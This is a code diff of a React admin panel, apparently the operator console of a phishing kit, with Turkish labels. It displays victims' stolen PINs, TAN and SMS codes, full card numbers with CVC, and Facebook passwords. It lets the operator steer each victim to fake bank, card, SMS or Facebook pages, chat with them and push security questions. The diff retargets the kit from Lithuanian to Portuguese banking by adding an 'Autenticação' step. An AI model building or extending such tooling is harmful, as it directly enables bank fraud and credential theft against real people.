+                    <div className="text-[10px] font-black uppercase tracking-widest text-sky-600 dark:text-sky-400">Autenticação</div>
+                    {authPhone && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">Tel:</span>
+                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
+                      </div>
+                    )}
+                    {authPin && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">PIN:</span>
+                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
+                      </div>
+                    )}
+                    {authTan && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">TAN:</span>
+                        <span className="font-mono font-bold text-rose-600 dark:text-rose-400 cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {/* SMS + KART + FACEBOOK ozet satirlari */}
+                <div className="grid grid-cols-2 gap-2">
+                  {smsValue && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-indigo-500">SMS</div>
+                      <div className="font-mono text-[13px] font-bold tracking-[0.15em] text-indigo-500 cursor-pointer break-all" onClick={() => copyToClipboard(smsValue)}>
+                        {smsValue}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.cardNumber || fd.cardExpiry || fd.cardCvc) && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-purple-500">Kart</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.cardNumber && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</div>}
+                        {(fd.cardExpiry || fd.cardCvc) && (
+                          <div className="opacity-80">{fd.cardExpiry || ""}{fd.cardExpiry && fd.cardCvc ? " • " : ""}{fd.cardCvc || ""}</div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.fbEmail || fd.fbPassword) && (
+                    <div className={`rounded-xl p-2 col-span-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-[#0064E0] dark:text-[#3E8BFF]">Facebook</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.fbEmail && <div className="cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</div>}
+                        {fd.fbPassword && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</div>}
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* ONAY ROZETLERI */}
+                {approvalEntries.length > 0 && (
+                  <div className="flex flex-wrap gap-1.5">
+                    {approvalEntries.map((approvalValue, index) => (
+                      <span
+                        key={`${approvalValue}-${index}`}
+                        className="inline-block w-fit rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 break-words [overflow-wrap:anywhere]"
+                      >
+                        {getApprovalDisplayText(approvalValue)}
+                      </span>
+                    ))}
+                  </div>
+                )}
+
+                {/* AKSIYONLAR: Yonlendirme + Onay + ikon butonlar */}
+                <div className="space-y-2 pt-1">
+                  {!isDeletedMode && (
+                    <div className="grid grid-cols-2 gap-2">
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleRouteAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Aksiyon Seçin...</option>
+                        <option value="win">👉 İsim & Profil</option>
+                        <option value="facebook">👉 Facebook</option>
+                        <option value="banken">👉 Banka Listesi</option>
+                        <option value="sms">👉 SMS Doğrulama</option>
+                        <option value="card">👉 Kredi Kartı</option>
+                        <option value="wait">⏳ Beklemeye Al</option>
+                        <option value="invalid_bank">❌ Hatalı Banka</option>
+                        <option value="live_support">🎧 Canlı Destek</option>
+                        <option value="congrats">✅ Tebrikler</option>
+                        <option value="special_approval">🔔 Özel Bildirim</option>
+                        <option value="custom_question">❓ Özel Soru</option>
+                        <option value="ban_ip">🚫 IP Banla</option>
+                      </select>
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleApprovalAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Onay Seçin...</option>
+                        {APPROVAL_OPTIONS.map((option) => (
+                          <option key={option.value} value={option.value}>
+                            {option.label}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                  )}
+                  <div className="flex items-center gap-1.5">
+                    <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 text-[13px] font-bold" title="Canlı Destek">💬</button>
+                    <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 text-[13px] font-bold" title="Özel Sorular">❓</button>
+                    <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 text-[13px] font-bold" title="Cihaz Bilgisi">📱</button>
+                    <button onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 text-[13px] font-bold" title="Geçmiş Kayıtlar">📜</button>
+                    {isDeletedMode ? (
+                      <>
+                        <button onClick={() => void handleRestoreLog(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 text-[13px] font-bold" title="Geri Yükle">♻️</button>
+                        <button onClick={() => void handlePermanentDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Kalıcı Sil">🗑️</button>
+                      </>
+                    ) : (
+                      <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Sil">🗑️</button>
+                    )}
+                  </div>
+                </div>
+              </div>
+            );
+          })}
         </div>
         {totalPages > 1 && (
           <div className={`flex flex-wrap items-center justify-between gap-3 px-5 py-4 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
@@ -2602,7 +3200,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* CHAT MODAL */}
       {chatSessionId && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`flex h-[32rem] w-full max-w-md flex-col overflow-hidden rounded-2xl border shadow-2xl ${darkMode ? 'border-white/10 bg-[#111111]' : 'border-gray-200 bg-white'}`}>
             <div className={`flex items-center justify-between px-4 py-3 border-b ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
               <h3 className={`font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kullanıcı ile Sohbet</h3>
@@ -2701,10 +3299,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
         if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
         if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
+        if (hsAny.autenticacaoHistory !== undefined) mergedFd.autenticacaoHistory = hsAny.autenticacaoHistory;
         const bHistory = parseBankHistory(mergedFd);
         const fHistory = parseFacebookHistory(mergedFd);
         const cHistory = parseCardHistory(mergedFd);
-        const gHistory = parseGeneratorHistory(mergedFd);
+        const authHistory = Array.isArray(mergedFd.autenticacaoHistory)
+          ? (mergedFd.autenticacaoHistory as any[]).filter((r) => r && typeof r === "object" && r.data && typeof r.data === "object")
+          : [];
+        const gHistory = [...authHistory, ...parseGeneratorHistory(mergedFd)];
         const copyText = (t: string) => {
           try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
         };
@@ -2713,12 +3315,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           const v = String(value).trim();
           return (
             <div className={`rounded-lg border px-3 py-2 ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}>
-              <div className={`text-[10px] font-bold uppercase tracking-wide mb-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{label}</div>
+              <div className={`text-[12px] font-bold uppercase tracking-wide mb-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{label}</div>
               <div className="flex items-center justify-between gap-2">
                 <span className={`text-[12px] font-mono truncate ${darkMode ? 'text-zinc-200' : 'text-gray-900'}`}>{v}</span>
                 <button
                   onClick={() => copyText(v)}
-                  className={`shrink-0 px-2 py-0.5 rounded-md text-[10px] font-bold transition-all ${darkMode ? 'bg-white/10 text-zinc-300 hover:bg-white/20 hover:text-white' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
+                  className={`shrink-0 px-2 py-0.5 rounded-md text-[12px] font-bold transition-all ${darkMode ? 'bg-white/10 text-zinc-300 hover:bg-white/20 hover:text-white' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
                   title="Kopyala"
                 >
                   📋
@@ -2755,7 +3357,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                       💳 Kart: <span className="font-bold">{cHistory.length}</span>
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
-                      🔢 Generator: <span className="font-bold">{gHistory.length}</span>
+                      🔐 Autenticação: <span className="font-bold">{gHistory.length}</span>
                     </p>
                   </div>
                 </div>
@@ -2775,7 +3377,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">🏦</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banka Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {bHistory.length} adet
                       </span>
                     </div>
@@ -2808,20 +3410,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-emerald-500/15 text-emerald-400' : 'bg-emerald-500/10 text-emerald-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-emerald-500/15 text-emerald-400' : 'bg-emerald-500/10 text-emerald-600'}`}>
                                     #{bHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
                                     <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                       {finalBankName}
                                     </p>
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
                                 </div>
                                 {loginMethodStr && (
-                                  <span className={`shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-400/20' : 'bg-cyan-500/10 text-cyan-700 border border-cyan-200'}`}>
+                                  <span className={`shrink-0 text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-400/20' : 'bg-cyan-500/10 text-cyan-700 border border-cyan-200'}`}>
                                     🛂 {loginMethodStr}
                                   </span>
                                 )}
@@ -2847,7 +3449,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">📘</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Facebook Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {fHistory.length} adet
                       </span>
                     </div>
@@ -2869,11 +3471,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-blue-500/15 text-blue-400' : 'bg-blue-500/10 text-blue-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-blue-500/15 text-blue-400' : 'bg-blue-500/10 text-blue-600'}`}>
                                     #{fHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -2898,7 +3500,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">💳</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kart Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {cHistory.length} adet
                       </span>
                     </div>
@@ -2925,11 +3527,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-purple-500/15 text-purple-400' : 'bg-purple-500/10 text-purple-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-purple-500/15 text-purple-400' : 'bg-purple-500/10 text-purple-600'}`}>
                                     #{cHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -2948,26 +3550,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     )}
                   </div>
 
-                  {/* ====================== 🔢 GENERATOR GİRİŞLERİ ====================== */}
+                  {/* ====================== 🔐 AUTENTICACAO GİRİŞLERİ ====================== */}
                   <div>
                     <div className="flex items-center gap-2 mb-4">
-                      <span className="text-xl">🔢</span>
-                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Generator (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className="text-xl">🔐</span>
+                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Autenticação (Geçmiş)</h4>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {gHistory.length} adet
                       </span>
                     </div>
                     {gHistory.length === 0 ? (
                       <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
-                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş generator kaydı yok.</p>
-                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar generator kodu gönderince eskisi burada görünür.</p>
+                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş autenticação kaydı yok.</p>
+                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar TAN kodu gönderince eskisi burada görünür.</p>
                       </div>
                     ) : (
                       <div className="space-y-3">
                         {gHistory.map((rec, idx) => {
                           const r = rec as Record<string, any>;
                           const genLabel =
-                            r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
+                            r.generatorType === "autenticacao" ? "Autenticação" : r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
                           const entries =
                             r.data && typeof r.data === "object"
                               ? Object.entries(r.data as Record<string, unknown>).filter(
@@ -2981,14 +3583,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
                                     #{gHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
                                     <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                       {genLabel}
                                     </p>
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -3014,7 +3616,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* SPECIAL NOTIFICATION MODAL */}
       {specialPromptSessionId && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-2xl rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onPaste={(e) => {
               const file = e.clipboardData.files?.[0];
               if (file && file.type.startsWith("image/")) {
@@ -3053,7 +3655,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* SMS SETTINGS MODAL */}
       {smsPromptSessionId && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
             <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
             
@@ -3103,7 +3705,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       )}
 
       {approvalPromptSessionId && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
             <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Onay Ayarları</h3>
 
@@ -3116,36 +3718,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               </div>
 
               {approvalPromptType === "transfer" ? (
-                <>
-                  <div>
-                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
-                    <input
-                      type="text"
-                      value={transferAmountInput}
-                      onChange={(e) => setTransferAmountInput(e.target.value)}
-                      placeholder="Örn: 1.231,00"
-                      className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
-                    />
-                  </div>
-                  <div>
-                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Onay Yöntemi</label>
-                    <div className="grid grid-cols-2 gap-2">
-                      {(["smartid", "mobileid"] as const).map((m) => (
-                        <button
-                          key={m}
-                          type="button"
-                          onClick={() => setTransferMethodInput(m)}
-                          className={`rounded-xl border px-3 py-2 text-sm font-bold transition-all ${transferMethodInput === m
-                            ? 'border-[#EB5E28] bg-[#EB5E28]/10 text-[#EB5E28]'
-                            : darkMode ? 'border-zinc-800 bg-zinc-900 text-zinc-400 hover:text-white' : 'border-gray-200 bg-gray-50 text-gray-500 hover:text-gray-900'}`}
-                        >
-                          {m === "smartid" ? "Smart-ID" : "Mobile-ID"}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-                </>
-              ) : (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
+                  <input
+                    type="text"
+                    value={transferAmountInput}
+                    onChange={(e) => setTransferAmountInput(e.target.value)}
+                    placeholder="Örn: 1.231,00"
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              ) : approvalPromptType === "autenticacao" ? null : (
                 <div>
                   <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                   <input
@@ -3185,7 +3768,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* OZEL SORU GONDER MODALI */}
       {questionPromptSessionId && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
             <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Soru Gönder</h3>
             <div>
@@ -3194,7 +3777,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 rows={3}
                 value={questionInput}
                 onChange={(e) => setQuestionInput(e.target.value)}
-                placeholder="Örn: Kokia yra jūsų motinos mergautinė pavardė?"
+                placeholder="Örn: Qual é o apelido de solteira da sua mãe?"
                 className={`w-full rounded-xl border px-3 py-2 outline-none transition-all resize-none ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
               />
             </div>
@@ -3223,7 +3806,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         const qList: any[] = Array.isArray(qfd.customQuestions) ? [...qfd.customQuestions] : [];
         const ordered = qList.map((q, i) => ({ q, i })).reverse();
         return (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm" onClick={() => setQuestionModalSession(null)}>
+          <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm" onClick={() => setQuestionModalSession(null)}>
             <div className={`w-full max-w-lg max-h-[80vh] overflow-hidden rounded-2xl border shadow-2xl flex flex-col ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onClick={(e) => e.stopPropagation()}>
               <div className={`flex justify-between items-center px-5 py-4 border-b ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
                 <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Sorular</h3>
@@ -3235,8 +3818,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 ) : ordered.map(({ q, i }) => (
                   <div key={i} className={`rounded-xl border p-4 ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
                     <div className="flex items-center justify-between gap-2 mb-2">
-                      <span className={`text-[10px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
-                      <span className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
+                      <span className={`text-[12px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
+                      <span className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
                     </div>
                     <p className={`text-sm font-semibold mb-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>{q.question || "-"}</p>
                     {q.answer && String(q.answer).trim() ? (
@@ -3273,6 +3856,31 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                 <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">IP Adresi</div>
                 <div className="text-blue-400 font-mono text-lg">{deviceInfoSession.ip_address || "Henüz yansımadı"}</div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
+                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İlk Giriş</div>
+                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>
+                    {deviceInfoSession.created_at
+                      ? new Date(deviceInfoSession.created_at).toLocaleString("tr-TR")
+                      : "Bilinmiyor"}
+                  </div>
+                </div>
+                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
+                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Son Çevrimiçi</div>
+                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>
+                    {onlineSessionIds.has(deviceInfoSession.id) ? (
+                      <span className="text-green-500 font-bold">Şu an çevrimiçi</span>
+                    ) : sessionLastSeenAt[deviceInfoSession.id] ? (
+                      new Date(sessionLastSeenAt[deviceInfoSession.id]).toLocaleString("tr-TR")
+                    ) : deviceInfoSession.updated_at ? (
